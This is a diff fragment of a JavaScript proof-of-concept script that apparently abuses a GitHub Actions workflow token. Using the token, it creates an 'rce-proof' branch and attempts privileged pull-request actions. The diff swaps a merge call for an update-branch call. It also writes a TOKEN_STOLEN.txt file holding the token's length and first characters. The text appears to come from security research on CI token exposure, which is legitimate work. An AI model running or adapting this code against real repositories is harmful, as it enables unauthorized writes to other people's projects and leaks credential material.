@@ -179,8 +179,8 @@ function api(method, path, body) {
     ref: 'refs/heads/rce-proof-' + runId, sha: process.env.GITHUB_SHA || ''
   });
   console.log('API create-ref (contents:write attempt) => ' + ref.status + ' ' + ref.body.slice(0, 300));
-  const mg = await api('PUT', '/repos/' + repo + '/pulls/__PR__/merge', { merge_method: 'merge' });
-  console.log('API merge (contents:write attempt) => ' + mg.status + ' ' + mg.body.slice(0, 300));
+  const ub = await api('PUT', '/repos/' + repo + '/pulls/__PR__/update-branch', {});
+  console.log('API update-branch (contents:write attempt) => ' + ub.status + ' ' + ub.body.slice(0, 300));
   try {
     fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/TOKEN_STOLEN.txt',
       'token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + '\n');
